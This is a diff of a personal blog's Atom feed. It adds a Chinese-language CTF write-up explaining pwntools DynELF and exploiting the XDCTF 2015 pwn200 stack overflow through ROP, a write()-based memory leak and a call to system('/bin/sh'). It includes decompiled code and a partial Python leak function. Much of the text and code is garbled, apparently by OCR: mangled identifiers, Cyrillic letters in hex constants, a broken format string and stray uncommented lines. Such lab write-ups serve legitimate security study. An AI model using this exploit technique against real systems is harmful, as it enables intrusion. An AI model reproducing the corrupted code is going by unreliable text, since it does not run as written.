@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cc-nianchu.github.io</id>
     <title>nianchu</title>
-    <updated>2021-07-18T03:48:46.900Z</updated>
+    <updated>2021-07-21T05:27:14.290Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cc-nianchu.github.io"/>
     <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
@@ -10,6 +10,88 @@
     <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
     <icon>https://cc-nianchu.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, nianchu</rights>
+    <entry>
+        <title type="html"><![CDATA[DynELF]]></title>
+        <id>https://cc-nianchu.github.io/post/dynelf/</id>
+        <link href="https://cc-nianchu.github.io/post/dynelf/">
+        </link>
+        <updated>2021-07-21T04:27:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="dynelf原理">DynELF原理</h2>
+<p>通过信息泄露漏洞，DynELF将对任意内存进行搜索,它首先找到ELF文件在内存中的基地址，然后定位到libe并对其进行解析，从而找到所需函数符号的地址，具体步骤如下。</p>
+<p>(1)搜索内存找到字符串“\x7ELF”， 该字符串的地址即为ELF的基地址;</p>
+<p>(2)解析ELF文件，得到DYNAMIC段的基地址，并通过该地址得到link map链表，此时有两种方法:一种 是通过.dynamic里的DT DEBUG,它是一个指向 structr debug的指针，其第二个元素指向link map;另一种是通过.got.plt节，其前3项分别是.dynamic、link_ map 和dl _runtime resolve的地址;</p>
+<p>(3 )遍历link map,对比1_ name找到libc后，通过1 addr获得libc的基地址;</p>
+<p>( 4)解析libc,通过DT_ _GNU HASH、DT STRTAB:和DT SYMTAB分别得到哈希表( .gnu hash/ .hash)、字符串表(sttab )和符号表( symtab );</p>
+<p>(5)通过哈希表找到所需函数(如system )的内存地址。</p>
+<h2 id="例题-xdctf-2015pwn200-攻防世界进阶区第二题">例题 XDCTF 2015:pwn200  攻防世界进阶区第二题</h2>
+<p>获得题目后先checksec pwn_200</p>
+<pre><code> Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+</code></pre>
+<p>打开ida32 F5获得伪代码</p>
+<pre><code>int __cdecl main()
+{
+  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF
+
+  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);
+  memset(&amp;buf[24], 0, 0x4Cu);
+  setbuf(stdout, buf);
+  write(1, buf, strlen(buf));
+  sub_8048484();
+  return 0;
+}
+ssize_t sub_8048484()
+{
+  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF
+
+  setbuf(stdin, buf);
+  return read(0, buf, 0x100u);
+}
+</code></pre>
+<h3 id="程序分析">程序分析</h3>
+<p>漏洞比较明显，sub 80484840函数试图读取010个字节到个0x6e字节大小的buf上，存在缓冲区溢出漏洞。由于没有Canay,我们可以很轻松地在栈上布置ROP链、并控制EIP。只需要注意32位程序通过栈传递参数。</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>(1)利用栈溢出，在栈上布置ROP链，修改返回地址，从而控制EIP:</p>
+<p>(2 )利用wrieO函数构造DynELF的leak函数，进行信息泄露，从而得到libe,从中查找system0函数的地址;</p>
+<p>(3)利用read(0函数将字符串“in/hsx00&quot; 读人.bss 节;</p>
+<p>(4)调用system(&quot;/bin/sh&quot;),获得shell.</p>
+<p>第一阶段利用DynELF泄露得到system()函数的内存地址，leak func()如下所示。</p>
+<pre><code>def leak func (addr) :
+
+io. recvline ()
+
+payload= &quot;А&quot;*(0хбс +4)
+
+payload += p32 (write_ plt)
+
+# write(1, addr, 4)
+
+payload += p32 (pppr_addr)
+
+clean the stack
+
+payload += p32 (1)
+
+payload += p32 (addr)
+
+payload += p32 (4)
+
+payload += p32(_start_addr)                 # start again
+
+io. send (payload)
+
+data = io. recv(4)
+
+log. info(&quot;leaking: 0x%x -&gt; %s&quot; 8 (addr, (data or '') .encode('hex')))
+return data
+</code></pre>
+<p>每次执行write()函数后，都需要一个&quot;pop;pop;pop;ret&quot;的gadget将3个参数弹出，从而使栈达到平衡，然后再返回到start函数开启下一轮，从而满足DynELF需要循环泄漏的条件</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[利用格式化字符串漏洞获得Canary进行栈溢出]]></title>
         <id>https://cc-nianchu.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-huo-de-canary-jin-xing-zhan-yi-chu/</id>
